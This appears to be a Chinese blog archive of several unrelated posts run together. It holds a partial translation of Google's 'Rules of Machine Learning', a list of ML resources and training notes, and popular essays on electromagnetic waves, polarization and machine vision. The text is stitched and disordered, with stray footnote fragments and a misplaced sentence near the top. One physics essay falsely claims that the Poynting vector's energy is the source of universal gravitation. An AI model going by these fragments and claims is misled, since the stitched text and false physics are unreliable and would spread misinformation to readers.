简单模型容易处理反馈循环。（参考 Rule #36）
我们经常用预测的概率来做决策，如利用排序降低的期望值（如点击概率/下载概率）来对posts进行排序。然而，当选择哪个模型的时候，决策本身要比模型数据的概率似然度更加重要（参考 Rule #27）。
Rule #15: 在策略层区分垃圾邮件过滤器和质量排序（Policy Layer）
质量排序是高端艺术，而垃圾邮件过滤是a war。确定post质量使用的信息对于经常使用该系统的人来说很明显。他们很容易调整他们的posts来适应这个系统。因此，你的系统应该关注在正常内容的排序上，不应该对给予垃圾信息的算法进行降权。同样，关于种族歧视的内容不应该是质量排序关注的范围，应该被独立出来进行处理。垃圾邮件过滤就不同了。你希望产生的特征一直变化，通常系统的规则很明显（如果一个post被超过三个算法判定为垃圾邮件，就不要检索它等）。这些模型必须每天进行更新，如果更新的慢，那么内容的创作者的名声等稳定特性将会成为系统的主要判断因素了。
某些层面，这两个系统的输出不得不进行整合。请记住，在搜索结果中过滤垃圾信息应该比垃圾邮件过滤的策略更加激进。从训练数据中移除垃圾信息，对于信息质量分类，这是公认的标准化处理流程。
reference: 
- http://feisky.xyz/machine-learning/resources/rules_of_ml.html 
- Rules of Machine Learning: Best Practices for ML Engineering
从事外贸的人经常几个国家到处飞，极可能在居住地上具有多个值。 
- 样例（Example）: 特征明确实例和标签的组合。 
- 模型（Model）：预测任务的统计性表示。你通过在样例上训练模型，并用其作出预测。 
- 度量（Metric）: 你关注的数值，直接或间接的被用来做优化。 
- 目标（Objective）：算法尝试优化的一种度量。 
- 管道（Pipeline）：围绕机器学习算法的基础结构。包括数据收集，数据清洗，模型训练，模型导出用于生产。 ↩solid, 在管道过程中，处理方式不恰当往往容易造成信息的损失等。 
这个方法的效果已经能赚很多钱了，或使人们高兴一阵子的了。不同于这个方法，只有当没有了简单的方法能够提升效果的时候，才需要慢慢的尝试往将来的版本里面加入一些复杂的特征。 ↩ 









作者：黄永刚
ML Phase II: 特征工程
第一阶段介绍了机器学习的一个周期，为学习系统获取训练数据，通过有趣的引导设计指标，创建一个服务框架。在有了一个完整系统之后，就进入了第一阶段。
第二阶段有很多比较容易的东西。任务就是将大量丰富的特征搞进系统中。因此，机器学习的第二阶段就是获取尽可能多的特征并将其有意的组合。第二阶段，所有的指标应该任然在提升。很多东西开始开发，很多工程师将一起花费大量的时间处理数据，以便于你能够创建出非常优秀的学习系统。
Rule #16:
不要尝试一次做出完美的模型，或者打算停止模型迭代。因此需要考虑是否当前增加的信息会延缓未来的迭代。很多团队花费一个季度在建立一个模型上，或者数年时间都在进行模型迭代。建立新模型很必要，原因如下： 
1. 你不断发掘出新的特征。 
2. 你可能调整了正则，改变了原来特征的处理方式。 
3. 你可能调整了目标。
无论如何，多给模型一些关注总是好的额，查找一些数据并回馈给旧模型或许帮助你找到新的信息，所以在建立模型的时候，就要考虑添加或移除特征或者重新组合特征的难度如何。考虑重建原来pipeline的一个新复制版本难度大与否，验证其正确性难不难。考虑并行运行两三个副本的难度大不大。最后，暂不考虑从35个中抽取16个特征是不是就进行模型更新。这是下一个阶段干的事情。
Rule #17: 开始时，使用可直接观察或可以记录的特征作为学习特征的反面。
这个看就有争论了，但是它可以避免很多容易犯的错误。首先，首先阐述一下学习特征是什么。学习特征是从外部系统获得的特征（例如通过聚类获得的）或者通过模型自身获得（因子模型或深度学习）。这些都很有用，但是也存在很多问题，所以在第一个模型中就不要使用它。
如果使用外部系统生成特征，要认识到那个系统有它自己的目标。外部系统的目标或许是以周期性与当前的系统目标相关。如果你利用的是外部系统的一个副本，那么它很快就过时了。如果你更新了这个特征，那么它代表的意思可能已经发生了变化。
因子模型和深度模型最大的问题是它们是非凸的。因此不能保证找到近似最优解，或许每次迭代找到的都是一个不同的局部最小。这种变化就导致了很大程度上很难判定其对于你的系统影响是有意义的还是随机的噪声。如果不利用深度特征，你可得到一个较好性能的基准模型。有了这个基准之后，你就可以尝试更加复杂的方法了。
Rule #18: 从不同的场景中找到特征
通常一个机器学习系统是一个大的业务场景的很小的一部分。例如，判断一个post是不是应该上热榜，很多人在这个post上热榜之前可能对这个post,赞、转发、评论。如果提供这些信息给学习器，可能提高了所优化场景中没有数据post的权重。YouTube的 ‘自动播放下一个’ 功能就利用了来自YouTube搜索中的数据（一个视频看过之后又看了哪个视频，对此数据进行频率统计，即看了又看）你也可以使用明显的用户评分。最后，如果你使用用户行为作为标签，用户行为在不同场景中的释义将会是很好的特征。这些特征将会将其他场景信息带入这个场景中。记住这不是个性化：找到喜欢这个内容的人群，然后判断其喜欢的程度。
Rule #20: 用人能够理解的方式对已存特征进行改写和组合创建新的特征。
有很多的方法修改和组合特征。机器学习系统像TensorFlow允许你使用transformations预处理数据。两个标准方法：离散化和交叉。
离散化是将连续性特征离散，创建出以值为标签的离散特征。如年龄是连续特征。使用一个特征表示年龄小于18岁，18到35岁的为另一个特征等等。不要过多的考虑这个边界，可以参考基础的分位数。
交叉是将多个特征进行交叉组合。特征列，在TensorFlow的terminology中是一组同质的特征。（如{男、女}，{美国、加拿大、墨西哥}等）。特征交叉出新特征，如{男、女}*{美国、加拿大、墨西哥}。新特征包含这样的值{男、加拿大}。如果你使用TensorFlow做特征交叉，这个特征{男、加拿大}表示男性加拿大人。使用多个基本特征形成的交叉特征将需要大量的数据来训练模型。
交叉会产生大量的特征，有可能会过拟合。例如，你在做搜索排序，有查询词的向量和文档词向量。如果采用交叉组合，将会产生大量的特征（参考Rule #21）。当处理文本问题，这里有两个变种。严格一点大多应用点乘。点乘的最简单形式是计算查询和文档共用词汇的数量。这个特征也可以被离散化。另一种变种是使用交集：只使用那些 同时出现在查询和文档中的词作为特征。
Rule #21: 从线性模型中可学到的特征权重数目大体和拥有的数据量成比例
统计学习理论中对于模型复杂度的描述是很有意思的，这些知识是基础，你需要知道。我以前说过，人们怀疑可以从一千个样本中学到任何东西，或者最多需要的样本数量不会超过一百万。这是由于这些人陷入了特定的学习方法中了。其实这个的关键在于调整你的学习方法适应于你的数据量的大小： 
1. 假设你从事搜索排序系统，在文档和查询中有上百万的不同词汇，而且你又1000个标记样本，那么你可以使用文档和查询的词频-逆文频率与六个其他人工特征的点乘。1000样本，12个特征。 
2. 如果有100万样本，获取文档和查询特征的交集，使用正则化和可能的特征选择。获取的数百万特征在正则化的作用下就会变得很少。1000万样本或许只会获得10万特征。 
3. 如果有数十亿的样本，交叉文档词和查询字符的特征，并使用特征选择和正则化。10亿样本只会用到1000万的特征。
统计学习理论很少给出精确的边界，但是对于起点给出了很好的指引。最后使用Rule #28去决定使用哪些特征吧！
Rule #22: 清除掉你不在使用的特征
不用的特征就是技术债务。如果发现没有使用的特征，并将其和其他特恒组合之后仍然不起作用，那么将其从你结构里面清楚出去。保持结构整洁以便于能够尽快的寻找到有价值的特征。
添加或保留哪些特征，要多考虑特征的覆盖率。这个特征在多少的样例里面出现？例如，考虑个人属性，如果只有8%的用户有这些特征，那么添加这些特征的效果不会很好。
同时，一些特征或许对于权重有很重要的作用。如一个特征只有1%的覆盖率，但是有这个特征的数据90%都是正样例，那这个特征就是很好的。

人工分析系统
进入机器学习第三阶段之前，学习一下：怎么看一个模型，并改进它。这是非常重要的，而且所有机器学习相关课程中不会讲述这些东西。这是优点偏艺术的成分，因此，告诉你一些反面模式帮助你少跳坑。
Rule #23 你不是典型的最终用户
很多团队容易陷入这个陷阱里面。员工应该自己看产品原型的性能是否正确。当产品明显变差时，就应该果断抛弃掉；当产品原型看起来比较合理的时候，就需要做进一步的测试。可以花钱请一些非行业内人士回答问题或者对用户做在线实验。
这样做有两个原因。第一，你太熟悉业务了。你可能看的角度和大众不同，或者会对产品存在情绪上的代入感。第二，你的时间太宝贵了。你能想象9个工程师坐在一个会议室里面讨论这些东西的代价有多大。
如果你真的需要用户的反馈，就使用调查用户体验方法。在早期的时候创造一个用户意像，并做可用性测试。用户意像是假设一个用户。例如，如果你的团队里面都是男性，那么设计一个35岁的女性意像，看它会做出什么样的选择。将你的站点（本地或者远程）给真实的人看看他们的反应，对于可用性可能会有不同的观点。
Rule #24 衡量模型之间的差异
在展示给其他人看之前，最简单或许最有用的方法就是，计算不同模型在产品系统中结果输出的差异大小。例如，对于排序问题，将两个模型使用同一个查询样例在整个系统中跑一遍，比较一下结果的加权大小。如果差异非常小，那你完全不用在跑实验就可以告诉别人它们的变化不大；如果两者差异比较大，那就要考考确认一下变化的好坏了。认真查看差异比较大的情况能够帮助你理解变化在质量上是什么样子地。然而一定要确保系统是稳定的。确认模型和自身比较的对称误差（symmetric difference）很低，理想情况为0.
Rule #25: 选择模型的时候，实用效果最关键
你的模型可能做的是点击率预测。然而，最终关键的问题是你要拿这个预测值做什么。如果你用来对文档进行排序，那么最终排序的质量才是关键，而不是预测本身。如果你用来判断文档是不是垃圾内容而选择是不是将其屏蔽掉，那选择‘阈值’的准确度就比预测本身重要。大多数情况这两者应该都是一致的。当它们不一致的时候，通常获得收益也很小。因此，模型的改变使得损失函数减小，但是却降低了系统的性能，那就换个特征吧。当这种情况经常发生的时候，那就需要你再次审视一下你的模型目标是不是恰当的。
假设你得到一个模型做错的样例。在分类中，应该是假阳或者假阴（false positive or false negative, FP or FN）。在排序中，是一对样例，其中正样本的排名低于负样本。看待这个一种重要的观点是：机器学习系统知道它是错的，但若你能提供机会，它自己会修正过来。如果你给模型喂进一些特征，那么模型自己会尝试修正。
另外，如果你尝试基于一些样例创造一些特这，然而这个样例系统比不将其视作错误，那么这个特征将被忽略掉。例如，在Play应用搜索中，有人搜索了‘免费游戏’。假设靠前的结果都是相关度比较低的 gag app,那么你创建一个特征来表达gag app.如果你正在优化应用安装数量，当人们搜索‘免费游戏’的手就会安装gag app，这个特征‘gag app’并没有取得你想要的效果。
一旦你发现模型错误的样例，那你就从当前特征集合之外找找有哪些趋势。例如，如果系统看上去会将posts较长的权重降低。那么将这个长度作为特征加入里面。不要太关注你所添加特征的细节了。如果你将要将post的长度加入里面，不要尝试去猜长度怎么定义才好，你只需要扔一堆特征进去，让模型自己去找哪个有用。这个才是你获得想要结果最简单的方法。
Rule #27: 量化不理想行为
你的团队成员当遇到一些他们不愿看到且没有被已存的损失函数捕获的系统情况时，可能变得沮丧。此时，无论做什么都要将这种抱怨转变成坚实的数字。例如，如果他们认为在Play搜索中有太多的‘gag apps’,应该使用专人来识别gag apps。（在这种情况下你可以灵活的使用人工标注的数据，因为这些查询部分可能占了很大一部分流量）。如果你的问题可以衡量，那就开始将其作为特征、目标或者指标。总结一句话，“量化第一，优化第二”。
Rule #28: 短期行为相同不意味长期行为相同
假设你有一个新系统做文档审计的，之后在计算每个查询对于每个文档的点击率。你会发现它的行为和当前线上系统不论在任何测试中都是相同的。鉴于它比较简单，你直接使用它。然而你慢慢发现新上架的应用不会出现在这里。为啥呢？那是因为你的系统仅仅是基于历史查询记录来展示文档，没有办法处理新文档的情况。
唯一可以理解系统在长期表现如何的方法是，将模型上线产生记录，在来训练。这就比较扯了。

训练和上线服务之间的偏差
训练性能和服务性能之间的差异可能由一下原因引起： 
- 训练和服务时的在处理数据的流程上存在不一致的地方 
- 训练和服务时数据发生了变化 
- 模型和算法之间形成了回馈环流 
我们在Google的机器学习系统中见到过这种偏差，对系统产生了负面影响。最好的解决办法就是做监控确保系统和数据的变化导致的偏差能够被注意到。
Rule #29: 确保训练和服务一致的最好方法就是保存服务中的特征集，在将其用在训练当中
即便不对每一个样本都这样做，只选择一部分也是可以的，只要能够确认服务和训练的一致性就行（参考Rule #37）。有的时候Google的团队们应用这种方法获得了惊人的结果。YouTube主页通过应用这个方法质量上获得很大提高，同时也减小了代码的复杂度。很多团队都在往这种结构上转。
Rule #30: 数据采样使用的权重可不能随意丢掉
当你有太多的数据时，倾向于使用1-12忽略13-99.这是错误的，在过去很多的团队在训练中丢弃数据导致了很多问题。虽然从来没有展示给用户的数据可以被丢弃，但是可以被其他用来做重要性衡量。重要性衡量指的是如果你对X进行30%的采样，它将给这个数据一个10/3的权重。有重要性衡量，在Rule #14中谈论的属性矫正就是可以做的。
Rule #31 如果要合并训练和服务时段的数据，这个数据可能会发生变化
假设一要合并一个包含文档特征的表格，如评论和点击数。在训练阶段和服务阶段，特征可能是不同的。模型对于相同文档的预测可能在训练和服务时不同。最简单的避免这个的方式就是记录服务时段的特征（参考Rule #32）。如果表格变化的比较缓慢，你可以每小时或每天对最近的数据做快照。注意这依然没有解决掉这个问题。
Rule #32 尽可能在训练流程和服务流程中重用代码
批处理和实时处理是不同的。实时处理中当有请求达到，就要处理。然而在批处理中，你可以将这些任务集中起来一起处理。服务阶段，你做的是实时处理，而训练做的是批处理。要重用代码还有一些其他事情要做。例如，你可以创建一个独特的系统对象，请求的结果或者合并的结果以人可读的方式存储，而且保证错误可以很容易的被测试出来。之后，一旦你将所有信息汇总起来，无论是训练阶段的还是服务阶段的，你就可以使用通用的方法对该人可读的对象和系统需要的格式之间建立转化桥梁，此时无论系统需要什么格式都可以容易的处理了。这种方法从根源上减少了训练和服务的偏差。一个推论，不要尝试在训练和服务中使用两种编程语言，否则重用代码就成了几乎不可能的事情。
Rule #33 如果模型试验使用的数据是截止5号的，那么就使用6号以后的数据对其进行测试
通常，模型评估使用的数据是训练数据之后的，这样可以很好的反映出在生产环境中系统的表现。如果模型试验使用的数据是截止5号的，那么就使用6号以后的数据对其进行测试。可以预知在心数据上的表现不会很好，但是它也不应该太差。或许由于日期的影响，你可能不能预测出平均点击率或者转化率，但是AUC（area under the curve），代表正样例的评分高于负样例的似然性，应该是比较接近的。
Rule #34: 二值分类的过滤中（垃圾邮件或感兴趣邮件），为了获得干净的数据需要做出微小的牺牲
在过滤中，标记为负的样本不会呈现给用户。假设模型可以在服务中过滤75%的负样本。你可能想获得用户的其他样例作为训练数据。例如，如果用户将邮件标记为垃圾邮件，而你没能过滤掉，你可能像从这个学习到一些东西。
但是这种方法引入了样本偏差。你可以将你需要过滤掉的1%样本作为‘held out’,并将其依旧发送给用户，这样你就可以获得更加干净的数据了。而你的过滤器至少还能过滤74%的负样本。这些‘held out’样本就可以变成你的训练数据了。
如果过滤器有95%及以上的过滤比例，这个方法看起来可行性就不高了。即便如此，如果你想评估服务质量的性能，你可以使用更小的样本比例（比方说0。1%或0.001%）。有一万个样本做估计足以获取到相当精准的结果了。
Rule #35: 排序问题中的固有偏差
当你转变算法足够激进的时候，不同的结果就会出现。这样你已经改变了算法未来会用到的数据。这种固有偏差就会出现，在设计模型的时候就应该加以考虑。这里有几个方法。这些方法更偏爱模型已经看到过的数据： 
1. 对于覆盖更多查询的特征给予给高的正则系数，覆盖面小的特征则相反。该方法更偏爱那些泛化性不是很好的特征（即比较独特的特征）。这个方法可以阻止非常流行的结果泄入不相关的查询当中。注意，传统的建议是对于具有更多独特值的特征给予更高的正则系数，这里和它不一样。 
2. 将特征权重限制在正数范围内。因此好的特征降会由于‘unkown’特征（0权重特征）。 
3. 不要只获取文本特征。这是#1的一个拓展。例如对于任何查询，有一些app都是热门，你肯定不希望任何地方都展示它。1

Rule #36: 避免位置特征的回馈循环
内容呈现的位置很大程度像影响着用户的交互的喜好度。如果你将一个APP放在第一个的位置，那它就会获得更多的点击，你会认为这个APP本身受到更多的偏爱和点击。一种解决办法是加入位置特征。将位置特征加入模型一起训练，模型自身会学习这个权重，例如，第一位的获得较高的权重。因此你的模型对于位于第一位的样本的其他因子会给予更小的权重。之后，再服务阶段，你不会给出位置权重，或者都是默认值，那是因为对候选进行评定之后才会决定展示的次序（译注：不要因果倒置）。
将位置特征和其他模型特征分开来是很重要的，这是由于训练和测试的不对称性决定的。最好的方式是对其他特征函数和位置特征函数求和。还有不要和位置特征做特征交叉。
Rule #37: 评估训练或服务偏差
这里有些事情在很多场景中会导致偏差。而且可以将其分成几个部分： 
1. 训练数据和holdout数据的性能差异通常会一直存在，也不会一直都是坏的。 
2. holdout数据和‘新一期’数据之间的性能差异也会一直存在。你应该调整正则化来最大化‘新一期’数据上的性能。但是，如果holdout和‘新一期’数据上的性能差异比较大，那表明了其中一些特征对时间太过敏感了，很可能降低了模型的性能。 
3. 同样，‘新一期’数据上的性能和实时数据的也存在差异。如果你对训练数据和服务阶段的同一个样本进行模型预测，它们应该给出完全相同的数据。因此，如果存在差异，很大程度上表明工程商存在错误。
reference: 
- http://feisky.xyz/machine-learning/resources/rules_of_ml.html 
- Rules of Machine Learning: Best Practices for ML Engineering
不愿将流行的app到处展示的原因是要保证所有用户想要的app都是可见的。例如，如果有人搜索‘bird watching app’,他们可能下载了‘愤怒的小鸟’，但是那不是他们真正的意图。展示这种APP或许可以提高下载率，但是却忽略了用户最终的满意度。 ↩ 









很久没有更新图形图像处理方面的博客了，最近在培训数据发掘方面的技术，就把学到的东西和大家分享下。机器学习的项目到底怎么做呢？具体如何和业务结合落地，我们一起来慢慢探索这整个的生态圈。

1. 压箱底的资料
还有一些平时收集 的压箱底的资料拿出来和大家分享下：
1.1 IPOL ----经典计算机视觉算法的c实现
http://www.ipol.im/?utm_source=doi

1.2 https://www.codecademy.com/ ----在线编程自学成才
我的python就是在这个网站自学的，基本上把python的基本数据结构，list，dist等等介绍了一遍，只要一周左右甚至更短的时间就可以基本掌握一门全新的语言

1.3 在线绘制框图----没有visio的最好选择
https://www.processon.com/

如果没有visio这是最好的选择！
1.4 一些大牛的博客
刘未鹏
http://mindhacks.cn/
http://mindhacks.cn/2011/11/04/how-to-interview-a-person-for-two-years/
http://mindhacks.cn/2012/08/27/modern-cpp-practices/
廖雪峰的python教程
https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000
1.5 写技术博客的选择
在csdn耕耘了8年有余，一直很喜欢这里，然而不知道为何身边的朋友高手就是github，stackoverflow。学习过程中不时记录总结的习惯非常重要，正所谓温故而知新。
后面我也准备尝试一些其他的平台

知乎：https://www.zhihu.com/people/wynshiter/activities
https://cn.wordpress.org/
简书：
https://pages.github.com/

1.6 机器学习算法的c++ sdk（提供更多选择）

Dlib是一个使用现代C++技术编写的跨平台的通用库，遵守Boost Software licence.它包含机器学习算法和工具，用于在C++中创建复杂的软件来解决现实问题。它在工业和学术界被广泛应用于各种领域，包括机器人，嵌入式设备，移动电话和大型高性能计算环境。
主要特点如下：
1.完善的文档：每个类每个函数都有详细的文档，并且提供了大量的示例代码，如果你发现文档描述不清晰或者没有文档，告诉作者，作者会立刻添加。
2.可移植代码：代码符合ISO C++标准，不需要第三方库支持，支持win32、Linux、Mac OS X、Solaris、HPUX、BSDs 和 POSIX 系统
3.线程支持：提供简单的可移植的线程API
4.网络支持：提供简单的可移植的Socket API和一个简单的Http服务器
5.图形用户界面：提供线程安全的GUI API
6.数值算法：矩阵、大整数、随机数运算等
7.机器学习算法：
8.图形模型算法：
9.图像处理：支持读写Windows BMP文件，不同类型色彩转换
10.数据压缩和完整性算法：CRC32、Md5、不同形式的PPM算法
11.测试：线程安全的日志类和模块化的单元测试框架以及各种测试assert支持
12.一般工具：XML解析、内存管理、类型安全的big/little endian转换、序列化支持和容器类
参考网页：

2017年最牛逼的五个机器学习项目
https://www.kdnuggets.com/2017/01/five-machine-learning-projects-cant-overlook-january.html


35个最牛逼的机器学习项目
https://mp.weixin.qq.com/s/zBaOHSMqC7v7dML9AWPLiA


使用dlib 的python接口实现换脸
http://python.jobbole.com/82546/

1.7 可视化感受机器学习的整个过程
1.神经网络的训练：http://playground.tensorflow.org
我们选择一个数据为非线性切分的复杂例子

2.两层简单神经网络演示非线性切分
http://cs.stanford.edu/people/karpathy/convnetjs//demo/classify2d.html
3.神经网络进行手写字符识别
http://terencebroad.com/convnetvis/vis.html


2.  Transwarp 机器学习培训
转型机器学习方向的过程是痛苦的。最近在上海花了一周时间参加transwarp的数据分析师培训，这是我时隔7年之后再次踏上魔都的土地。上次来这里还是7年前来看上海世博会，不同的是此处上海之行是由北京启程。我乘坐的是最早一班复兴号列车，由于很多外国人都在新奇 的拍照，这一路风驰电掣的路过祖国的大好河山，让我也怀揣着满满的民族自豪感惊异于祖国 的发展速度。2010年那会来上海一趟多难呀，尤其要买个卧铺，真是难上加难。
非常感谢单位领导给予的宝贵培训机会，之前说实话并未有全面系统的学过机器学习内容。但最重要的还是不知道：真实，工业级，业务上究竟怎么开展机器学习与业务的结合工作。这次培训基本给了我答案。transwarp 通过
推荐其支持托拉拽的机器学习产品sophon，让我直观的感受了整套机器学习工具平台的使用过程，以及机器学习模型的建模套路。其中之前我一直不太注重的有以下两点：
1.特征工程，归一化，字符串索引
2.评价指标，roc，方差和等
##2.1 机器学习的算法

2.2 到底如何衡量业务是否需要机器学习？

业务问题是否适用机器学习算法？
如何选择模型
设计开发节奏
最终产品的检验

2.3 完整的数据发掘建模流程

2.4 特征工程
特征工程是机器学习的决定性因素，是机器学习成功的关键
“数据和特征决定了机器学习的上限，而模型和算法只是逼近这个上限而已”
纵观Kaggle、KDD，阿里天池等国内外大大小小的比赛，每个竞赛的冠军其实
并没有用到很高深的算法，大多数都是在特征工程这个环节做出了出色的工作，
然后使用一些常见的算法，比如Linear Regression（线性回归），就能得到出色的
性能。
领域特定知识（ domain specific knowledge），

最近还看到公众号上面一些好的文章，整取领悟以后分享出来
2.5 可视化托拉拽机器学习产品
感觉以下这两个产品有点类似
KNIME https://www.knime.com/
对于机器学习和数据科学的初学者来说，最大的挑战之一是需要同时学习太多知识，特别是如果你不知道如何编码。你需要快速地适应线性代数、统计以及其他数学概念，并学习如何编码它们，对于新用户来说，这可能会有点难以承受。
如果你没有编码的背景并且发现很难学习下去，这时你可以用一个GUI驱动的工具来学习数据科学。当你刚开始学习的时候，可以集中精力学习实际的项目。一旦适应了基本的概念，你就可以在以后慢慢学习如何编写代码。
在今天的文章中，我将介绍一个基于GUI的工具：KNIME

sophon
星环还通过Transwarp Sophon来帮助数据工程师开发数据挖掘的应用。Sophon提供了可视化界面工具Midas 用于创建模型,用户只需通过拖拽数据源对象和运算符就能完成模型设计,然后将设计的模型在TDH集群上训 练或预测分析。
此外,Sophon还整合了深度学习框架Tensorflow,使用户可以通过拖拽生成各种神经网络模型,灵活调参和训练,将大数据和人工智能结合起来推动业务创新。

3. 经典案例----泰坦尼克乘客的生还预测，房价预测
http://blog.csdn.net/sinat_32547403/article/details/71269804
http://blog.csdn.net/ZengHaihong/article/details/53199559
4. 优秀开源机器学习库
28款GitHub最流行的开源机器学习项目
https://yq.aliyun.com/articles/30794
15 个开源的顶级人工智能工具
http://blog.jobbole.com/106447/
5.普通程序员如何学习机器学习
https://www.zhihu.com/question/51039416
https://github.com/Avik-Jain/100-Days-of-ML-Code-Chinese-Version

未完待续。。。。








年岁渐长，我们越来越懂得“月有阴晴圆缺”，真相总不完美，万物皆有规律。心脏跳动的规律，生物钟调节的规律，四季变换的规律，人生状态的规律…… 我们似乎越来越不相信直线变的化东西，越来越觉得凡事都有起伏，有低谷，有高潮.我们开始知觉这种总在变换的节奏，试图掌握平衡。我们不再急于向前冲，而是开始适应身体的节奏，时间的节奏，环境的节奏。于是我们学会了宠辱不惊，在低谷时屏住呼吸，完美逆袭；在高潮时优雅转身，落入凡尘。于是我们心领神会的在心中绘制出这样一条曲线正弦波通过以上图我们可以看出，正弦波上的点和圆上的点相对应，我们假想圆是一个时钟的表盘，那么指针每走的一步都会相应体现在正弦波的前进起伏上。由此，我们可以直观的理解，波具有随时间和空间上变换的周期性。这一规律，即波动方程，可以用如下公式描述           即：波函数空间上的变化率与时间上的变化率同步“物质在更高层次上的作用是统一的”小到一个人的身体规律，大到整个宇宙本质，都有相似的地方光作为一种电磁波，充斥着整个宇宙，同样也遵循着一切波动的规律。这一规律，即波动方程，可以用如下公式描述现在我们再来回顾一下麦克斯韦方程组       其实麦克斯韦仅仅用数学公式就推测出了电磁波的存在,以及由于电磁波的传播速度和光速一致（或相似），推断出“光就是一种电磁波”，但是电磁波的证实还要等到数十年以后。由于电场和磁场的变化都满足波动方程式，我们可以回到一开始提到的正弦波，用正弦波来表示电磁波方程的一般解，即：            由此，我们由电磁场的原理推理出电磁场在时空中的变化规律，并将体现这一规律的电磁波与光统一起来，不过这还没有结束。下面我们把时空中某处电磁能量用一个矢量表示，即坡印廷矢量     这个具有方向的能量，就是万有引力的来源！麦克斯韦的伟大之处，在于完成了物质本质的一次统一，将电、磁、波、光统一起来。爱因斯坦，在麦克斯韦的理论基础上，试图提出“大一统理论”，即将宇宙万物在本质上再一次完成统一，可惜直到他去世，也未能走出这个思维“隧道”，如果可以，我们将在隧道的另一头，看到上帝本人。








 
作者：赵蕾
 

黑色，宇宙最初的颜色，为零。当有了光，就有了颜色，所有的颜色汇聚在一起，成白色。
白色是集大成的颜色，好似一片混沌，清浊不分。
而你的真色彩，可能是一道靓丽的彩虹。
就像人的性格是复杂的，复杂的人性交织在一起，可能呈现出一个平凡的人，透过平凡穿入内心，也许放射出一种不一样的色彩。
这个色彩，就是属于你自己的震动方向。
就是，属于你自己的，偏振：）
我们都知道，颜色是由光的波长或者频率决定的。但是光还具有另一个性质：偏振。光波沿着不同方向振动，形成偏振，会影响到我们对色彩的接收和辨识。

光的偏振，就是单个光波的扰动方向。
既然我们知道光波本质上就是电磁波。那么，光的偏振方向实际上就是电磁波振动的方向，由于实际情况中，电场分量比磁场分量要强大许多，因此，我们可以只考虑电场分量的振动。也就是，电场的振动方向，就是光的偏振方向。
回顾《机器视觉3——电磁波》，我们了解到，光波，即电磁波的传播符合波动方程，本质上是一个正弦波。如下图。

从上图，可以看出，光波沿Y轴上下振动，而波的传播方向，沿Z轴传播。波的振动方向（Y）与传播方向（Z）具有垂直关系。
事实上，从几何光学观点描述的话，无论是平面光（图2）还是球面光（图3）,其光的传播方向总与电场的扰动方向垂直

现在，从上述描述中，我们抽取出单个光波，那么它的振动在垂直于传播方向，即XOY平面上的投影，应该是一条直线。如下图。

我们称之为线性偏振。从上图可以看出，对于线性偏振，光波始终在一个平面(YOZ)内振荡。
它的波动方程为（在此我们用余弦代替正弦表述）：

现在光波不仅局限在一个平面（YOZ）内振荡，而且还沿Z轴旋转。这样它在垂直于传播方向的平面（XOY）内的投影就是一个椭圆。如下图：

我们称这种偏振为椭圆偏振。
此时波动方程组为：

其中：

也就是说光波t时刻的某一点在X轴上的投影位置，不再是0，而是和时间t以及波在X、Y方向的初始相位有关的值。也就是说，波在XOY平面上的投影不再是与Y轴重合的直线，而是与X、Y轴都相关的曲线。
这条曲线的轨迹，也就是振动在XOY上的投影是个椭圆，如下图.

由此，我们可以看出，电磁波或者说电场的扰动方向决定了光的偏振特性。线性偏振是椭圆偏振的特殊情况。
对于线性偏振而言，就像鱼儿在水里游，有的鱼儿左右摆动，有的鱼儿上下摆动。上下，左右，就构成了不同方向的偏振。假如有一张滤网，能够过滤出不同方向摆动的鱼儿，那这个滤网，就相当于一个偏振片，能够过滤出不同方向振动的线性偏振光，于是我们就可以从一片混沌的非偏振光中筛选过滤出偏振光。
偏振片大量用在摄影技术上，用来使景象更加清晰或颜色更加绚丽。双折射加偏振片，会观察到彩虹色。听说，若在飞机上透过偏振片观察舷窗之外的天空，会看到有彩虹出现。
参考：
《Machine Vision——Automated Visual Inspection:Theory,Practice and Applications》
知乎
本心







作者：赵蕾

       光，从我们第一眼看到这个世界，到最后一缕气息将我们引向轮回密境，它一直出现在我们周围，像空气一样平凡，却至关重要。
 
      上帝在人间的第一句话是：要有光。
 
      时间可以倒流的关键速度是：光速。
 
      光，可以使我们“看”到。感知万物，分辨美丑。
 

       视觉，以及善于辨识，是人类与生俱来的特殊能力。明眸善睐，可以直通心灵。但是随着科学技术的发展，用于“辨识”的机器视觉，也应运而生。这种机器辨识试图完成和人类视觉同样的功能，而且优点更为突出。
 
       我们通过传感器来接收物体传来的光学信息（颜色以及色调密度等），以数据（矩阵）的形式存储，然后通过计算机进行更深入的处理（比较，辨识，分类等）。
 
       机器不会受主观情绪的限制，没有疲劳，对物体信息的记忆更加精确并持久，通过确定的计算方法得出结论而不会出现“视觉混淆”的情况。
 
       人类视觉受可见光的限制，并且很难记住大量、精确的数据，比如当你修补一个带颜色的东西时，是不可能通过记忆来精确找到相同颜色配件的。
 
       这些问题对机器视觉来说是不存在，它不受可见光的限制，可以捕获更多人类感知不到的信息，并且能通过大量数据长久精确记忆物体的色彩密度以及色调密度这些信息，比较两个物体的颜色是否相同，只要比较两个物体的图像数据就搞定了。
 
以下是作为参考的机器视觉处理链
 

       在计算机对图像数据进行处理之前，我们首先要捕获图像信息。和人眼类似，机器视觉中的图像信息，是通过传感器捕获物体的光学特征而形成的。所以，理解光的物理特性，对机器视觉的建立至关重要。
 
       光具有波的属性和粒子的特性，任何一个单一特性都不能解释所有的光学现象，所以我们提到光的物理特性时，常常提到“波粒二相性”，即：光既可以看成是粒子组成，也具有“波”的特性。
 
       光，可以看成由光子组成。光子以300000km/s的速度匀速前行。光子及其能量可以被物质吸收，也可以由物质以光的形式释放出来。
 
       光，也可以看成是一种电磁波，光子的能量，同时和光的波长联系着。光子的能量越强，其相应光的波长越短。
 
       把不同途径产生的电磁波按频率从低到高排列,有无线电波、红外线、可见光、紫外线、X射线、γ射线这些频段
 
       可见光，是电磁光谱的一部分。

 
 
       在一定初始条件和边界条件下，光和其他电磁现象都可以有一组线性偏微分方程组描述，即，麦克斯韦方程组。
 
麦克斯韦方程组主要描述了电磁波的以下特性：
电荷产生电场
变化的电场产生磁场
而磁场，却不存在“磁荷”，它们是封闭的曲线。
变化的磁场能够产生电场
   

 
 
麦克斯韦方程组在电磁学中的地位，如同牛顿运动定律在力学中的地位一样。它所揭示出的电磁相互作用的完美统一，为物理学家树立了这样一种信念：物质的各种相互作用在更高层次上应该是统一的。
 
我们可以把光波看成是一种电磁波，遵循麦克斯韦方程组的定义；场的强度可以对应为光的强度，而图像传感器捕捉一段时间内的平均光强度。
 
